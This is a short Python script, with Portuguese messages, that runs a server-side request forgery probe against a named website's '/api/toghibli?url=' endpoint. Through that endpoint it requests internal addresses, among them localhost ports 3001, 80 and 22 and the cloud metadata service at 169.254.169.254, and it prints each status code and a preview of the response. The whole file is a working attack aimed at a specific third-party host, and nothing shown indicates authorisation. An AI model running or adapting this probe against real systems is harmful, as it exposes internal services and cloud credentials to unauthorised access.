import requests

TARGET = "https://zone.api.br/api/toghibli?url="

INTERNAL_ENDPOINTS = [
    "http://127.0.0.1:3001/api/auth/me",  
    "http://127.0.0.1:3001/api/status",   
    "http://127.0.0.1:80",               
    "http://127.0.0.1:22",               
    "http://169.254.169.254/latest/meta-data/" 
]

def test_ssrf():
    print("iniciando teste de SSRF no endpoint /api/toghibli...\n")
    
    for endpoint in INTERNAL_ENDPOINTS:
        print(f"[*] Testando: {endpoint}")
        try:
           
            response = requests.get(TARGET + endpoint, timeout=5)
            

            print(f" http:: {response.status_code}")
            
            text_preview = response.text[:100].replace('\n', '')
            print(f" resposta: {text_preview}...\n")
            
        except requests.exceptions.RequestException as e:
            print(f" erro de conexão: {e}\n")

if __name__ == "__main__":
    test_ssrf()